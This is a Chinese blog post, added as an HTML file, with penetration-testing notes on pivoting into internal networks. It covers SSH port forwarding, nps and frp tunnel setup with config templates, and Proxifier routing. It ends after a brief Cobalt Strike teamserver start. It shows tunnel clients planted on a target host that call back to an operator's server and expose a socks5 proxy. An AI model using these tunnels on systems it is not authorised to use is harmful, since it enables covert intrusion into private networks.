@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="端口转发这里只介绍使用ssh进行端口转发，讲三个转发方式，分别是本地端口转发，远程端口转发，动态转发。 本地端口转发这里先假设一个情景，有A,B,C三台主机，其中A能访问到B，B能访问到C，但是A访问不到C。现在为了让A能访问到C，可以进行端口转发从图里可以看到由于B主机对外有公网ip，所以B主机能被A主机访问到，并且由于B和C主机处于同一网段，从B主机可以访问到C主机的服务。例如现在C主机在88">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2022&#x2F;03&#x2F;03&#x2F;%E5%86%85%E7%BD%91&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="端口转发这里只介绍使用ssh进行端口转发，讲三个转发方式，分别是本地端口转发，远程端口转发，动态转发。 本地端口转发这里先假设一个情景，有A,B,C三台主机，其中A能访问到B，B能访问到C，但是A访问不到C。现在为了让A能访问到C，可以进行端口转发从图里可以看到由于B主机对外有公网ip，所以B主机能被A主机访问到，并且由于B和C主机处于同一网段，从B主机可以访问到C主机的服务。例如现在C主机在88">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;h5bvWacHsYgXrQj.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;WVIiaUhZTE5pqNw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;22&#x2F;Y8JN5jkbAPdrCZq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;22&#x2F;bAkHhjx62gtN34P.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;22&#x2F;QOlH9iF5eVEZ84J.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;22&#x2F;xlovkUWa6hApFS8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;8enfM67DOESgYcs.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;76kMRdrNJEpwYFi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;7ryxloChWY6Unfj.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;ZRbqmAK5sOXQvHz.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;CrslT9RHAgY3qLP.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;aSoQXId6kyN4R2t.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;5Bln7RXh2uWwEAs.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;ytqfOpM6QPXN1xb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;t4dXwyHuA9xehnS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;LCRYrmuvyiqxdpb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;sAdOkcQJULRwEgD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;vs47xCSu6yqX8MY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;iUQboJY2Epg6PHB.png">
+<meta property="og:updated_time" content="2022-03-22T03:45:50.085Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;03&#x2F;21&#x2F;h5bvWacHsYgXrQj.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/03/03/内网/"/>
+
+
+
+
+
+  <title>内网 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/03/03/%E5%86%85%E7%BD%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-03T13:34:53+08:00">
+                2022-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  13
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p>这里只介绍使用ssh进行端口转发，讲三个转发方式，分别是本地端口转发，远程端口转发，动态转发。</p>
+<h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>这里先假设一个情景，有A,B,C三台主机，其中A能访问到B，B能访问到C，但是A访问不到C。现在为了让A能访问到C，可以进行端口转发<br><img src="https://s2.loli.net/2022/03/21/h5bvWacHsYgXrQj.png" alt="1.png"><br>从图里可以看到由于B主机对外有公网ip，所以B主机能被A主机访问到，并且由于B和C主机处于同一网段，从B主机可以访问到C主机的服务。例如现在C主机在8888端口开启了一个web服务，那么可以通过下面这条命令将原本不能直接访问到的C的服务给访问到(假设B主机开放ssh服务并且有root用户和密码)<br><code>ssh root@116.36.15.24 -p [B主机的ssh端口] -L 127.0.0.1:8888:192.168.13.36:8888 -N -f</code><br>现在访问本地的 <a href="http://127.0.0.1:8888" target="_blank" rel="noopener">http://127.0.0.1:8888</a> 就是访问192.168.13.36的8888端口的web服务。为什么可以这样访问？<br>说原理，我也不懂。但是简单描述下流程还是可以的。由于B主机可以访问到C主机，那么我们这里这条命令就是在本地访问8888端口的时候，让B主机代替我们去访问C主机的8888端口，再把结果返回到本地.上面的命令是填好了的，看一下更简单的描述<br><code>ssh user@ssh-server-addr -p [ssh-port] -L 127.0.0.1:[本地端口]:[主机B能访问到的ip:port] -N -f</code><br>这条命令可能对端口转发有更好点的理解。本地端口是可以随意指定的。这里主要是主机B能访问到的ip比较值得写。主机B除了能转同网段某个机器的端口，也能把主机B自己的某个端口转发到本地来。现在假设这样一个情景主机B只有22端口是对外可访问的，但是主机B的7001开了weblogic，现在想要访问主机B的7001端口，那么可以这样做(假设ssh是22端口)<br><code>ssh root@116.36.15.24  -L 127.0.0.1:7001:192.168.13.6:7001 -N -f</code><br>这样就可以在本地的7001访问到主机B的7001服务</p>
+<h2 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h2><p>远程端口转发和本地端口转发感觉差不多，本地端口转发是把原本本地访问不到的端口通过ssh端口转发让本地可以访问到，而远程端口转发则是把本地的某个端口让原本远端访问不到的主机能访问到。同样假设这样一个场景，有A,B,C,D四台主机，其中A,B处于同一网段，C是一台服务器，D是与A,B不能互相访问的远程客户端，如图：<br><img src="https://s2.loli.net/2022/03/21/WVIiaUhZTE5pqNw.png" alt="1.png"></p>
+<p>C上有ssh服务，B有C的ssh账号密码，现在想要让D能够访问A的8888端口上的某个web服务，可以通过远程端口转发的方式来实现。命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@113.26.35.16 -R 127.0.0.1:8888:192.168.13.65:8888 -N -f</span><br></pre></td></tr></table></figure>
+<p>现在，访问 <a href="http://113.26.35.16:8888" target="_blank" rel="noopener">http://113.26.35.16:8888</a> 就能访问到A的8888端口的服务了。<br>这条命令中-R表示要将ssh用作远程端口转发，后面接远端ssh的地址和端口，由于一般都是转到ssh服务器，所以前面的127.0.0.1一般会省略，远端地址后面接的是远端端口。再接下来就是把要转发的服务的地址和端口写上就行了。同样的，远程端口转发除了能转发A的服务当然也能转发B自身的服务。<br>其实如果换个角度来看，把这个看成本地端口转发。把B当成ssh服务器本身，而C当成宿主机，就会惊人的发现他们的相似性。区别在于C有公网ip，所以转发出来的服务能够被D访问到。</p>
+<h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p>动态转发和前面的两个端口转发有一个比较大的区别在于，动态转发是全端口转发，也就是一个socks5代理。前面的本地端口转发和远程端口转发在名字上都在上了端口的限定词，而转发的服务确实也是端口一一对应的，比如前面的本地转口转发，在本地访问7001也只能访问到对应机器的7001端口。而动态端口转发有点像翻墙，只要经过某个端口的流量，都由特定机器代为转发。现在假设存在以下情景，有ABCDE五台机器，A是独立的本地主机，BCDE在同一网段内，并且B对外有公网ip。要让A能访问到C,D,E上的某个服务，如果用前面的端口转发，得用三次端口转发，如果CDE上的服务更多，要访问更多服务，就要起一堆的ssh端口转发，这样显得太麻烦，所以有了端口转发。<br><img src="https://s2.loli.net/2022/03/22/Y8JN5jkbAPdrCZq.png" alt="1.png"><br>而动态转发也非常简单，同样的一条命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@112.36.153.24 -D 23456  -N</span><br></pre></td></tr></table></figure>
+<p>通用一点的写法可以抽象成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@tunnel-port -D local-port</span><br></pre></td></tr></table></figure>
+<p>这里的local-port就是本地端口，而tunnel-host则是ssh服务器，-D表示动态转发，-N表示这个ssh连接只进行转发，不登陆shell不执行远程命令只充当隧道。<br>执行完命令之后，现在本地经过23456端口的流量都会由112.36.153.24进行转发，是不是特别像翻墙。要让本机访问到192.168.153.*,只需要配置proxifier规则和服务器即可。</p>
+<p>这里用虚拟机去模拟动态转发，配置一下proxifier，同样用23456端口进而由ssh服务器进行转发。这里规则变成访问百度，方便测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh irrik@192.168.186.141 -D 23456 -N</span><br></pre></td></tr></table></figure>
+<p>配置服务器<br><img src="https://s2.loli.net/2022/03/22/bAkHhjx62gtN34P.png" alt="1.png"><br>配置规则并启用<br><img src="https://s2.loli.net/2022/03/22/QOlH9iF5eVEZ84J.png" alt="1.png"><br>接下来访问百度测试。<br><img src="https://s2.loli.net/2022/03/22/xlovkUWa6hApFS8.png" alt="1.png"></p>
+<h1 id="nps搭建步骤"><a href="#nps搭建步骤" class="headerlink" title="nps搭建步骤"></a>nps搭建步骤</h1><p>这里记录一下服务器搭建nps还有虚拟机上线的步骤，做一些最基础的笔记。<br>首先介绍一下nps。<br>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。虽然一直都把这玩意叫做nps，nps的，实际上nps应该分为两部分：服务端与客户端。由于是用go语言编写的，所以服务端和客户端也当然都区分了linux，windows。<br><img src="https://s2.loli.net/2022/03/21/8enfM67DOESgYcs.png" alt="1.png"><br>比如在linux上装服务器就用linux的nps，要上线linux的机器就用linux的npc。(这里的s和c分别是server和client的意思)。</p>
+<p>安装步骤，可以参考 <a href="https://github.com/ehang-io/nps/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/ehang-io/nps/blob/master/README_zh.md</a><br>但是还是记录下ubuntu下的安装吧。这里服务端是ubuntu16.04,压缩文件的结构如图<br><img src="https://s2.loli.net/2022/03/21/76kMRdrNJEpwYFi.png" alt="1.png"><br>我这里采用了windows下载linux下nps的对应文件然后上传到服务器的方式去安装。整个操作流程如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -vxzf linux_amd64_server.tar.gz  #解压文件夹</span><br><span class="line">sudo ./nps install #安装</span><br></pre></td></tr></table></figure>
+<p>到这里其实安装就完成了，但是由于使用的都是默认端口默认密码之类的，非常不安全，所以提供一个配置文件nps.conf </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">appname = nps</span><br><span class="line">#Boot mode(dev|pro)</span><br><span class="line">runmode = dev</span><br><span class="line"></span><br><span class="line">#HTTP(S) proxy port, no startup if empty</span><br><span class="line">http_proxy_ip=0.0.0.0</span><br><span class="line">http_proxy_port=10080</span><br><span class="line">https_proxy_port=10443</span><br><span class="line">https_just_proxy=true</span><br><span class="line">#default https certificate setting</span><br><span class="line">https_default_cert_file=conf/server.pem</span><br><span class="line">https_default_key_file=conf/server.key</span><br><span class="line"></span><br><span class="line">##bridge</span><br><span class="line">bridge_type=tcp</span><br><span class="line">bridge_port=18024</span><br><span class="line">bridge_ip=0.0.0.0</span><br><span class="line"></span><br><span class="line"># Public password, which clients can use to connect to the server</span><br><span class="line"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br><span class="line">public_vkey=123</span><br><span class="line"></span><br><span class="line">#Traffic data persistence interval(minute)</span><br><span class="line">#Ignorance means no persistence</span><br><span class="line">#flow_store_interval=1</span><br><span class="line"></span><br><span class="line"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br><span class="line">log_level=7</span><br><span class="line">#log_path=nps.log</span><br><span class="line"></span><br><span class="line">#Whether to restrict IP access, true or false or ignore</span><br><span class="line">#ip_limit=true</span><br><span class="line"></span><br><span class="line">#p2p</span><br><span class="line">#p2p_ip=127.0.0.1</span><br><span class="line">#p2p_port=6000</span><br><span class="line"></span><br><span class="line">#web</span><br><span class="line">web_host=[填web服务器的ip]</span><br><span class="line">web_username=[填用户名]</span><br><span class="line">web_password=[填密码]</span><br><span class="line">web_port = 18080</span><br><span class="line">web_ip=0.0.0.0</span><br><span class="line">web_base_url=</span><br><span class="line">web_open_ssl=false</span><br><span class="line">web_cert_file=conf/server.pem</span><br><span class="line">web_key_file=conf/server.key</span><br><span class="line"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="line">#web_base_url=/nps</span><br><span class="line"></span><br><span class="line">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="line">#Remove comments if needed</span><br><span class="line">#auth_key=test</span><br><span class="line">auth_crypt_key =1234567812345678</span><br><span class="line"></span><br><span class="line">#allow_ports=9001-9009,10001,11000-12000</span><br><span class="line"></span><br><span class="line">#Web management multi-user login</span><br><span class="line">allow_user_login=false</span><br><span class="line">allow_user_register=false</span><br><span class="line">allow_user_change_username=false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#extension</span><br><span class="line">allow_flow_limit=false</span><br><span class="line">allow_rate_limit=false</span><br><span class="line">allow_tunnel_num_limit=false</span><br><span class="line">allow_local_proxy=false</span><br><span class="line">allow_connection_num_limit=false</span><br><span class="line">allow_multi_ip=false</span><br><span class="line">system_info_display=false</span><br><span class="line"></span><br><span class="line">#cache</span><br><span class="line">http_cache=false</span><br><span class="line">http_cache_length=100</span><br><span class="line"></span><br><span class="line">#get origin ip</span><br><span class="line">http_add_origin_header=false</span><br><span class="line"></span><br><span class="line">#pprof debug options</span><br><span class="line">#pprof_ip=0.0.0.0</span><br><span class="line">#pprof_port=9999</span><br><span class="line"></span><br><span class="line">#client disconnect timeout</span><br><span class="line">disconnect_timeout=60</span><br></pre></td></tr></table></figure>
+<p>这个文件保存为nps.conf，上传到nps的同一目录下。安装完后对应的一些指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nps start|stop|restart|uninstall|update or nps-update update</span><br></pre></td></tr></table></figure>
+<p>启动服务后可以访问<a href="http://ip/18080" target="_blank" rel="noopener">http://ip/18080</a>  来管理nps客户端，用户名和密码就是写在配置文件里的用户名和密码。登录上去后界面大概如下<br><img src="https://s2.loli.net/2022/03/21/7ryxloChWY6Unfj.png" alt="1.png"><br>这里可以看到有个客户端连接端口，这个端口就是开放给npc回连的。<br>接下来点到客户端那里，新增一个客户端，新增好之后刷新一下页面，大概就像这样<br><img src="https://s2.loli.net/2022/03/21/ZRbqmAK5sOXQvHz.png" alt="1.png"><br>创建好客户端之后编辑客户端，这里的认证将会作为隧道的连接密码<br><img src="https://s2.loli.net/2022/03/21/CrslT9RHAgY3qLP.png" alt="1.png"><br>编辑好之后，点开那个加号，有一条命令需要在客户机那边执行，执行完之后客户机就算是上线了。<br><img src="https://s2.loli.net/2022/03/21/aSoQXId6kyN4R2t.png" alt="1.png"><br>复制这条命令。接下来把npc上传到目标靶机上(这里采用虚拟机的方式，ubuntu18.04)，把对应架构的npc上传到虚拟机中，这里同样采用下载压缩包后解压的方式。<br>解压好之后到npc的目录下，执行刚才复制的命令，再去刷新nps的管理端，发现主机已经在线了<br><img src="https://s2.loli.net/2022/03/21/5Bln7RXh2uWwEAs.png" alt="1.png"><br>接下来就可以配置主机完成相关功能。比如我想把这台主机用作一个socks代理，那就点到socks那里新增一个socks代理，客户端ID填上线主机的客户端ID，服务端端口只要不冲突是可以随意填的。<br><img src="https://s2.loli.net/2022/03/21/ytqfOpM6QPXN1xb.png" alt="1.png"><br>接下来配置一下proxifier去连接这个socks。<br>首先配置socks代理<br>Profile-&gt;Proxy Servers-&gt;add<br><img src="https://s2.loli.net/2022/03/21/t4dXwyHuA9xehnS.png" alt="1.png"><br>填写服务器的ip，端口这里刚才开了9999端口所以填9999就行。下面的代理方式选socks5，如果开了连接验证就把验证打开，填之前设置的账号和密码。<br>然后配置rule，也就是哪些行为走这个socks代理<br><img src="https://s2.loli.net/2022/03/21/LCRYrmuvyiqxdpb.png" alt="1.png"><br>接下来访问192.168.186.1/24这个网段都会通过socks5代理去转发。</p>
+<h1 id="frp搭建步骤"><a href="#frp搭建步骤" class="headerlink" title="frp搭建步骤"></a>frp搭建步骤</h1><p>frp与nps一样，都是go编写的。所以对于不同的架构有不同的客户端和服务端。这里还是采用ubuntu16.04作为服务端，ubuntu18.04的虚拟机作为客户端来做一个搭建演示。<br>首先下载frps对应的linux包。我在本地解压之后往服务器上传了两个文件，一个frps，一个frps.ini。配置文件这里提供一个模板</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 12345</span><br><span class="line"></span><br><span class="line">dashboard_addr = 0.0.0.0</span><br><span class="line">dashboard_port = 7890</span><br><span class="line"></span><br><span class="line">dashboard_user = [用户名]</span><br><span class="line">dashboard_pwd = [密码]</span><br><span class="line"></span><br><span class="line">authentication_method = token</span><br><span class="line">token = skajf;lksjflakfhjhkjasflkj</span><br></pre></td></tr></table></figure>
+<p>把两个文件都传到服务器上面之后，运行<br><code>./frps -c ./frps.ini</code><br>权限问题就自己给权限就行</p>
+<p>接下来就是把frpc和frpc.ini放到靶机上，这里的frpc选对应环境的frpc就行。同样的frpc.ini也给一个模板</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = [服务器ip地址]</span><br><span class="line">server_port = 12345</span><br><span class="line">token = skajf;lksjflakfhjhkjasflkj</span><br><span class="line">[frptest]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8888</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = testadmin</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
+<p>这里的配置文件就写好了这个客户端走的是socks5，认证的用户名和密码也都写了，服务器监听端口8888.其他的就是token要和frps.ini的token一样，没啥了。<br><code>./frpc -c ./frpc.ini</code> 启动客户端<br><img src="https://s2.loli.net/2022/03/21/sAdOkcQJULRwEgD.png" alt="1.png"><br>启动好之后可以就可以同样的配置proxifier去连接这个socks，端口填frps监听的端口，ip填对应ip。填好认证用户名和密码。<br><img src="https://s2.loli.net/2022/03/21/vs47xCSu6yqX8MY.png" alt="1.png"><br>接下来配置规则，和上面的nps的基本没啥区别。<br><img src="https://s2.loli.net/2022/03/21/iUQboJY2Epg6PHB.png" alt="1.png"><br>接下来访问192.168.186.1/24这个网段都会通过socks5代理去转发。</p>
+<h1 id="Cs安装服务端并配置"><a href="#Cs安装服务端并配置" class="headerlink" title="Cs安装服务端并配置"></a>Cs安装服务端并配置</h1><p>解压压缩包并进入目录，然后 ./teamserver 10.45.214 irrik<br><strong>cs的路线也走socks5，也就是说，我们cs客户端访问服务端，是通过：本机-kali-靶机-kali这个流程</strong><br>启动客户端：<br>cobaltstrike.bat</p>
+<h1 id="靶机上线"><a href="#靶机上线" class="headerlink" title="靶机上线"></a>靶机上线</h1><ul>
